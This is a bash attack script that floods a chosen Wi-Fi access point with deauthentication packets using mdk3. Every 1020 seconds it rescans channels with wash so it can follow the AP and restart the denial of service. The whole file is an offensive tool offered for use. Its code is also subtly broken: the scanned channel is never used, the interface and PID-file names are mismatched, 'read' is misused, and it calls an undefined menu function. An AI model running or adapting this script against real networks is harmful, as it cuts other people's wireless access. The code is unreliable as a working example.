#!/bin/bash
echo $$ >/tmp/terminalbis.pid

#####################################################

f_variables(){
intmoniteurbis="$(cat cartedos.txt)"
canalbis="$(cat apcanalbis.txt)"
BSSIDBIS="$(cat apmacbis.txt)"
ESSIDBIS="$(cat ssidbis.txt)"
echo "$intmoniteurbis"
while [ -z "${intmoniteurbis}" ]; do read -r ${intmoniteurbis}; done



echo "$canalbis"
while [ -z "${canalbis}" ]; do read -r ${canalbis}; done



echo "$BSSIDBIS"
while [ -z ${BSSIDBIS} ]; do read -r ${BSSIDBIS}; done



echo "$ESSIDBIS"
while [ -z "${ESSIDBIS}" ]; do read -r ${ESSIDBIS}; done
f_floodinstantane
}


#####################################################

f_checkap(){              
wash -i ${intmoniteurbis} -a -c ${canalbis} > output.txt &
echo $! >/tmp/airodump.pid
sleep 7;
if grep -q "${BSSIDBIS}" "output.txt" ; then 
   echo -e "\t\e[1;32m [+] El PA no ha cambiado de canal, reiniciando el DoS..."
sleep 1;
kill `cat /tmp/mdk3.pid`
kill `cat /tmp/airbase.pid`
kill `cat /tmp/airodump.pid`
rm -rf output.txt
f_floodinstantane
else
    echo -e "\e[1;31m [] El PA ha cambiado de canal... Se está buscando...\e[0m"
sleep 1;
rm -rf output.txt
kill `cat /tmp/mdk3.pid`
kill `cat /tmp/airbase.pid`
kill `cat /tmp/airodump.pid`
sleep 5;
fi

canal=1
wash -i ${intmoniteurbis} -a -c ${canalbis} > output.txt &
echo $! >/tmp/airodump.pid
sleep 7;
if grep -q "${BSSIDBIS}" "output.txt" ; then  
   echo -e "\t\e[1;32m [+] El PA está en el canal 1, reiniciando la DoS..."
sleep 1;
kill `cat /tmp/airodump.pid`
rm -rf output.txt
f_floodinstantane
else
    echo -e "\e[1;31m [] El PA no está en canal 1... Se está buscando...\e[0m"
sleep 1;
kill `cat /tmp/airodump.pid`
rm -rf output.txt
fi

canal=11
wash -i ${intmoniteurbis} -a -c ${canalbis} > output.txt &
echo $! >/tmp/airodump.pid
sleep 7;
if grep -q "${BSSIDBIS}" "output.txt" ; then 
   echo -e "\t\e[1;32m [+] El PA está en el canal 11, reiniciando la DoS..."
sleep 1;
kill `cat /tmp/airodump.pid`
rm -rf output.txt
f_floodinstantane
else
    echo -e "\e[1;31m [] El PA no está en canal 11... Se está buscando...\e[0m"
sleep 1;
kill `cat /tmp/airodump.pid`
rm -rf output.txt
fi

canal=6
wash -i ${intmoniteurbis} -a -c ${canalbis} > output.txt &
echo $! >/tmp/airodump.pid
sleep 7;
if grep -q "${BSSIDBIS}" "output.txt" ; then  
   echo -e "\t\e[1;32m [+] El PA está en el canal 6, reiniciando la DoS..."
sleep 1;
kill `cat /tmp/airodump.pid`
rm -rf output.txt
f_floodinstantane
else
    echo -e "\e[1;31m [] El PA no está en canal 6... Se está buscando...\e[0m"
sleep 1;
kill `cat /tmp/airodump.pid`
rm -rf output.txt*
fi

canal=13
wash -i ${intmoniteurbis} -a -c ${canalbis} > output.txt &
echo $! >/tmp/airodump.pid
sleep 7;
if grep -q "${BSSIDBIS}" "output.txt" ; then  
   echo -e "\t\e[1;32m [+] El PA está en el canal 13, reiniciando la DoS..."
sleep 1;
kill `cat /tmp/airodump.pid`
rm -rf output.txt
f_floodinstantane
else
    echo -e "\e[1;31m [] El PA no está en canal 13... Se está buscando...\e[0m"
sleep 1;
kill `cat /tmp/airodump.pid`
rm -rf output.txt
fi

canal=5
wash -i ${intmoniteurbis} -a -c ${canalbis} > output.txt &
echo $! >/tmp/airodump.pid
sleep 7;
if grep -q "${BSSIDBIS}" "output.txt" ; then  
   echo -e "\t\e[1;32m [+] El PA está en el canal 5, reiniciando la DoS..."
sleep 1;
kill `cat /tmp/airodump.pid`
rm -rf output.txt
f_floodinstantane
else
    echo -e "\e[1;31m [] El PA no está en canal 3... Se está buscando...\e[0m"
sleep 1;
kill `cat /tmp/airodump.pid`
rm -rf output.txt
fi

canal=12
wash -i ${intmoniteurbis} -a -c ${canalbis} > output.txt &
echo $! >/tmp/airodump.pid
sleep 7;
if grep -q "${BSSIDBIS}" "output.txt" ; then 
   echo -e "\t\e[1;32m [+] El PA está en el canal 13, reiniciando la DoS..."
sleep 1;
kill `cat /tmp/airodump.pid`
rm -rf output.txt
f_floodinstantane
else
    echo -e "\e[1;31m [] El PA no está en los canales  1 3 6 9 11 o 13... --FALLO DEL ATAQUE-- ¡Toma el control manualmente!\e[0m"
sleep 1;
kill `cat /tmp/airodump.pid`
rm -rf output.txt
fi

canal=3
wash -i ${intmoniteurbis} -a -c ${canalbis} > output.txt &
echo $! >/tmp/airodump.pid
sleep 7;
if grep -q "${BSSIDBIS}" "output.txt" ; then 
   echo -e "\t\e[1;32m [+] El PA está en el canal 3, reiniciando la DoS..."
sleep 1;
kill `cat /tmp/airodump.pid`
rm -rf output.txt
f_floodinstantane
else
    echo -e "\e[1;31m [] El PA no está en los canales  1 3 6 9 11 o 13... --FALLO DEL ATAQUE-- ¡Toma el control manualmente!\e[0m"
sleep 1;
kill `cat /tmp/airodump.pid`
rm -rf output.txt
fi

canal=10
wash -i ${intmoniteurbis} -a -c ${canalbis} > output.txt &
echo $! >/tmp/airodump.pid
sleep 7;
if grep -q "${BSSIDBIS}" "output.txt" ; then 
   echo -e "\t\e[1;32m [+] El PA está en el canal 10, reiniciando la DoS..."
sleep 1;
kill `cat /tmp/airodump.pid`
rm -rf output.txt
f_floodinstantane
else
    echo -e "\e[1;31m [] El PA no está en los canales  1 3 6 9 11 o 13... --FALLO DEL ATAQUE-- ¡Toma el control manualmente!\e[0m"
sleep 1;
kill `cat /tmp/airodump.pid`
rm -rf output.txt
fi

canal=7
wash -i ${intmoniteurbis} -a -c ${canalbis} > output.txt &
echo $! >/tmp/airodump.pid
sleep 7;
if grep -q "${BSSIDBIS}" "output.txt" ; then 
   echo -e "\t\e[1;32m [+] El PA está en el canal 7, reiniciando el DoS..."
sleep 1;
kill `cat /tmp/airodump.pid`
rm -rf output.txt
f_floodinstantane
else
    echo -e "\e[1;31m [] El PA no está en los canales  1 3 6 9 11 o 13... --FALLO DEL ATAQUE-- ¡Toma el control manualmente!\e[0m"
sleep 1;
kill `cat /tmp/airodump.pid`
rm -rf output.txt
fi

canal=2
wash -i ${intmoniteurbis} -a -c ${canalbis} > output.txt &
echo $! >/tmp/airodump.pid
sleep 7;
if grep -q "${BSSIDBIS}" "output.txt" ; then 
   echo -e "\t\e[1;32m [+] El PA está en el canal 2, reiniciando la DoS..."
sleep 1;
kill `cat /tmp/airodump.pid`
rm -rf output.txt
f_floodinstantane
else
    echo -e "\e[1;31m [] El PA no está en los canales  1 3 6 9 11 o 13... --FALLO DEL ATAQUE-- ¡Toma el control manualmente!\e[0m"
sleep 1;
kill `cat /tmp/airodump.pid`
rm -rf output.txt
fi

canal=8
wash -i ${intmoniteurbis} -a -c ${canalbis} > output.txt &
echo $! >/tmp/airodump.pid
sleep 7;
if grep -q "${BSSIDBIS}" "output.txt" ; then  
   echo -e "\t\e[1;32m [+] El PA está en el canal 8, reiniciando ls DoS..."
sleep 1;
kill `cat /tmp/airodump.pid`
rm -rf output.txt
f_floodinstantane
else
    echo -e "\e[1;31m [] El PA no está en los canales  1 3 6 9 11 o 13... --FALLO DEL ATAQUE-- ¡Toma el control manualmente!\e[0m"
sleep 1;
kill `cat /tmp/airodump.pid`
rm -rf output.txt
fi

canal=4
wash -i ${intmoniteurbis} -a -c ${canalbis} > output.txt &
echo $! >/tmp/airodump.pid
sleep 7;
if grep -q "${BSSIDBIS}" "output.txt" ; then 
   echo -e "\t\e[1;32m [+] El PA está en el canal 4, reiniciando la DoS..."
sleep 1;
kill `cat /tmp/airodump.pid`
rm -rf output.txt
f_floodinstantane
else
    echo -e "\e[1;31m [] El PA no está en los canales  1 3 6 9 11 o 13... --FALLO DEL ATAQUE-- ¡Toma el control manualmente!\e[0m"
sleep 1;
kill `cat /tmp/airodump.pid`
rm -rf output.txt
fi

canal=9
wash -i ${intmoniteurbis} -a -c ${canalbis} > output.txt &
echo $! >/tmp/airodump.pid
sleep 7;
if grep -q "${BSSIDBIS}" "output.txt" ; then 
   echo -e "\t\e[1;32m [+] el PA está en el canal 9, reiniciando el DoS..."
sleep 1;
kill `cat /tmp/airodump.pid`
rm -rf output.txt
f_floodinstantane
else
    echo -e "\e[1;31m [] El PA no está en los canales  1 3 6 9 11 o 13... --FALLO DEL ATAQUE-- ¡Toma el control manualmente!\e[0m"
sleep 1;
kill `cat /tmp/airodump.pid`
rm -rf output.txt
fi
}

#####################################################

f_floodinstantane(){       # boucle 1 qui test le contenu du fichier en appelant la fonction boucle 2 toute les x seconde  (fonction juste au dessus f_checkap)
           echo -e "\e[1;34m[*]\e[0m Iniciando la DoS... Se comprobará el canal del PA cada x segundos, x siendo el valor que has entrado..."
sleep 1;
xterm -hold -bg '#000000' -fg '#3A94FF' -e mdk3 ${intmoniteur} d -c ${canal} &> /dev/null &
echo $! >/tmp/mdk3bis.pid
sleep 4;
while : ; do
sleep 1020 ; f_checkap ; done
}


#####################################################
f_activedos(){
clear
echo "1.  Dos"
read -p "Choix: " menuchoix
case ${menuchoix} in
1) unset clean; f_floodinterface ;;
*) f_activedos ;;
esac
}


# run as root
if [ "$(id -u)" != "0" ]; then
	echo -e "\e[1;31m[]\e[0m Debes ejecutar hostbase con privilegios de administrador" 1>&2
	exit 1
else
	clean=1
	f_variables
fi
